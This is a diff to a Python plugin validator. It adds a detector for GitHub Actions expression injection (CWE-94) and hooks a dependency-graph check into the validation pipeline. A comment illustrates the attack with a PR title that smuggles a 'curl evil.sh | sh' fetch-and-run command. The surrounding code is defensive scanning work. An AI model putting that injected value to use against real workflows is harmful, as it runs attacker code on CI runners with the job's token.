@@ -6032,6 +6032,162 @@ def validate_workflow_path_broken(plugin_root: Path, report: ValidationReport) -
         )
 
 
+# =============================================================================
+# GitHub-Actions expression injection (RC-WORKFLOW-EXPR-INJECT, MAJOR, CWE-94)
+# =============================================================================
+# `${{ ... }}` is substituted by the runner as TEXT, BEFORE the shell (or the
+# github-script JS engine) ever parses the body. So an attacker-controlled
+# value spliced straight into a `run:` script is not an argument — it is source
+# code: a PR titled ``a"; curl evil.sh | sh; #`` executes on the runner with the
+# job's token. The documented fix is to bind the expression to an `env:` var and
+# reference it as a quoted shell variable (`"$PR_TITLE"`), which the shell reads
+# as data, never as code.
+#
+# The rule fires ONLY for an explicit UNTRUSTED-context allowlist (GitHub's own
+# "untrusted input" list), so the safe shapes never fire:
+#   * the same expression bound in `env:` and used as `"$VAR"` — an `env:` value
+#     is not a run body, so it is never scanned here;
+#   * static contexts (`matrix.*`, `runner.*`, `github.workflow`, `secrets.*`,
+#     `vars.*`, `env.*`, `job.*`) — not in the untrusted set;
+#   * expressions in non-shell keys (`if:`, `name:`, `with:`) — not a run body.
+# re2-safe: no lookaround, bounded quantifiers only.
+_GHA_EXPR_RE = re.compile(r"\$\{\{(?P<expr>.{0,500}?)\}\}", re.DOTALL)
+
+_GHA_UNTRUSTED_CONTEXT_RE = re.compile(
+    # Leading boundary instead of a lookbehind (re2 has none): the context must
+    # start a token, so `mygithub.event.x` / `x.inputs.y` do not match.
+    r"(?:^|[^A-Za-z0-9_.])"
+    r"(?P<ctx>"
+    r"github\.event\.[A-Za-z0-9_.]{1,200}"
+    r"|github\.head_ref"
+    r"|inputs\.[A-Za-z0-9_-]{1,100}"
+    r"|steps\.[A-Za-z0-9_-]{1,100}\.outputs\.[A-Za-z0-9_-]{1,100}"
+    r"|needs\.[A-Za-z0-9_-]{1,100}\.outputs\.[A-Za-z0-9_-]{1,100}"
+    r")"
+)
+
+
+def _scan_shell_context_expr_injection(body: str, body_start_line: int) -> list[tuple[str, int]]:
+    """Return ``(untrusted_context, absolute_line_no)`` for every untrusted
+    ``${{ ... }}`` expression interpolated inside a shell-context body.
+
+    ``body`` is a ``run:`` script or an ``actions/github-script`` ``script:``
+    program; both are interpolated as TEXT before execution, so the same rule
+    applies to each.
+    """
+    hits: list[tuple[str, int]] = []
+    for expr_match in _GHA_EXPR_RE.finditer(body):
+        expr = expr_match.group("expr")
+        ctx_match = _GHA_UNTRUSTED_CONTEXT_RE.search(expr)
+        if ctx_match is None:
+            continue
+        line_no = body_start_line + body[: expr_match.start()].count("\n")
+        hits.append((ctx_match.group("ctx"), line_no))
+    return hits
+
+
+def _collect_github_script_blocks(content: str) -> list[tuple[str, int]]:
+    """Extract every ``actions/github-script`` ``with.script:`` body as a
+    ``(body, line_no)`` list.
+
+    Structural (PyYAML) only: unlike ``run:``, a ``script:`` body is a shell
+    context ONLY when its step's ``uses:`` names ``actions/github-script``, and
+    that association cannot be recovered from a flat regex pass. An unparseable
+    workflow yields no github-script blocks (its ``run:`` bodies are still
+    covered by ``_collect_run_blocks``'s regex fallback).
+    """
+    blocks: list[tuple[str, int]] = []
+    try:
+        doc = yaml.safe_load(content)
+    except yaml.YAMLError:
+        return blocks
+    if doc is None:
+        return blocks
+
+    search_cursor = 0
+
+    def _walk(node: Any) -> None:
+        nonlocal search_cursor
+        if isinstance(node, dict):
+            uses = node.get("uses")
+            with_block = node.get("with")
+            if (
+                isinstance(uses, str)
+                and "actions/github-script" in uses
+                and isinstance(with_block, dict)
+                and isinstance(with_block.get("script"), str)
+            ):
+                script = with_block["script"]
+                body_start, search_cursor = _locate_run_body(content, script, search_cursor)
+                blocks.append((script, body_start))
+            for value in node.values():
+                _walk(value)
+        elif isinstance(node, list):
+            for item in node:
+                _walk(item)
+
+    _walk(doc)
+    return blocks
+
+
+def validate_workflow_expression_injection(plugin_root: Path, report: ValidationReport) -> None:
+    """Detect GitHub-Actions expression injection (RC-WORKFLOW-EXPR-INJECT, MAJOR).
+
+    Flags an UNTRUSTED-context ``${{ ... }}`` expression interpolated directly
+    into a shell context of a workflow — a ``run:`` script or an
+    ``actions/github-script`` ``script:`` program. The runner substitutes the
+    expression as raw text before the interpreter parses the body, so an
+    attacker-controlled value (a PR title, a branch name, a dispatch input, a
+    step output derived from any of those) becomes executable code (CWE-94).
+
+    MAJOR, matching the sibling command-injection-class workflow rules
+    (``RC-WORKFLOW-PATH-BROKEN``, the inline-Python quoting rule) — it blocks
+    ``--strict`` so the publish gate refuses to ship an injectable pipeline.
+
+    Two-sided by construction: the ``env:``-mediated fix, static contexts
+    (``matrix.*``/``runner.*``/``secrets.*``/``github.workflow``) and
+    expressions in non-shell keys (``if:``/``name:``/``with:``) are never
+    scanned or never match, so a hardened workflow produces ZERO findings.
+    """
+    workflows_dir = plugin_root / ".github" / "workflows"
+    if not workflows_dir.is_dir():
+        return
+
+    yaml_files = sorted(workflows_dir.glob("*.yml")) + sorted(workflows_dir.glob("*.yaml"))
+    if not yaml_files:
+        return
+
+    found_any = False
+    for yaml_path in yaml_files:
+        try:
+            content = yaml_path.read_text(encoding="utf-8")
+        except (OSError, UnicodeDecodeError):
+            continue
+        rel_path = str(yaml_path.relative_to(plugin_root))
+
+        blocks = [(body, line, "run:") for body, line in _collect_run_blocks(content)]
+        blocks += [(body, line, "github-script script:") for body, line in _collect_github_script_blocks(content)]
+
+        for body, body_start_line, kind in blocks:
+            for context, line_no in _scan_shell_context_expr_injection(body, body_start_line):
+                found_any = True
+                report.major(
+                    f"[RC-WORKFLOW-EXPR-INJECT] {rel_path}:{line_no} — untrusted "
+                    f"expression `${{{{ {context} }}}}` is interpolated directly into a "
+                    f"{kind} body. The runner substitutes it as text before the "
+                    "interpreter parses the script, so a crafted value executes as code "
+                    "(CWE-94). Bind it in the step's `env:` block and reference the "
+                    'quoted shell variable instead (e.g. `env: TITLE: ${{ ... }}` + `"$TITLE"`).',
+                    file=rel_path,
+                    line=line_no,
+                )
+
+    if not found_any:
+        report.passed(
+            f"No GitHub-Actions expression injection in {len(yaml_files)} workflow file(s) (RC-WORKFLOW-EXPR-INJECT)"
+        )
+
+
 def check_untested_until_release(plugin_root: Path, report: ValidationReport) -> None:
     """Advisory WARNING (NON-BLOCKING): flag a workflow that builds/stages a
     COMPILED BINARY artifact reachable ONLY from tag/release triggers, with NO
@@ -8491,6 +8647,32 @@ def _run_xref_in_pipeline(plugin_root: Path, report: ValidationReport) -> None:
         report.results.append(result)
 
 
+def _run_dependencies_in_pipeline(plugin_root: Path, report: ValidationReport) -> None:
+    """Run the dependency-graph (cascade) validator and merge findings.
+
+    Per TRDD-747d7bbc (CC v2.1.143 plugin dependency cascade detection):
+    catches broken dependency-graph states (cycles, missing deps, a dep
+    pointing at a disabled plugin) statically, before the user ever runs
+    ``claude plugin disable/install/enable`` and hits the runtime refusal.
+
+    Runs with NO marketplace context (this validator sees only the plugin
+    under test), so unresolvable deps report at the standalone MAJOR tier
+    rather than the marketplace-context CRITICAL tier — §2 of the TRDD.
+    Short-circuits to zero cost when the plugin declares no ``dependencies``
+    (§8 acceptance criterion 2).
+    """
+    try:
+        from validate_dependencies import validate_dependencies
+    except ImportError as e:
+        report.minor(f"Dependency-graph validator unavailable: {e}")
+        return
+
+    try:
+        validate_dependencies(plugin_root, None, report)
+    except Exception as e:  # noqa: BLE001 — defensive boundary
+        report.minor(f"Dependency-graph validation crashed: {type(e).__name__}: {e}")
+
+
 def _derive_cache_report_path(main_report_path: Path) -> Path:
     """Sibling path for the separate cache-audit report.
 
@@ -8940,6 +9122,12 @@ def main() -> int:
         # detection (RC-GHOST-DISPATCH-001 CRITICAL when Task() / subagent_type
         # literals reference agents that don't exist).
         ("_run_xref_in_pipeline", _run_xref_in_pipeline, ((), {})),
+        # TRDD-747d7bbc — dependency-graph (cascade) validation: cycles,
+        # missing deps, and disabled-target deps that would trip CC
+        # v2.1.143's `claude plugin disable` cascade refusal at runtime.
+        # Runs AFTER xref (broken backtick refs must not confuse dep
+        # resolution hints — §10 of the TRDD).
+        ("_run_dependencies_in_pipeline", _run_dependencies_in_pipeline, ((), {})),
         ("validate_rules", validate_rules, ((), {})),
         ("validate_output_styles", validate_output_styles, ((), {})),
         ("validate_readme", validate_readme, ((), {})),
@@ -8957,6 +9145,11 @@ def main() -> int:
         ("validate_pipeline_readiness", validate_pipeline_readiness, ((), {})),
         ("validate_pipeline_script_refs", validate_pipeline_script_refs, ((), {})),
         ("validate_workflow_path_broken", validate_workflow_path_broken, ((), {})),
+        # TRDD-WT0FLTMM: BLOCK GitHub-Actions expression injection (CWE-94) — an
+        # untrusted `${{ ... }}` spliced into a `run:` / github-script `script:`
+        # body executes as code on the runner. MAJOR, so publish.py Gate 3
+        # refuses to ship an injectable pipeline.
+        ("validate_workflow_expression_injection", validate_workflow_expression_injection, ((), {})),
         # #115 part-5 — NON-BLOCKING advisory: a binary build/stage reachable
         # only from tag/release with no push/PR smoke job. WARNING-level (never
         # changes the verdict / blocks --strict). The standard canonical
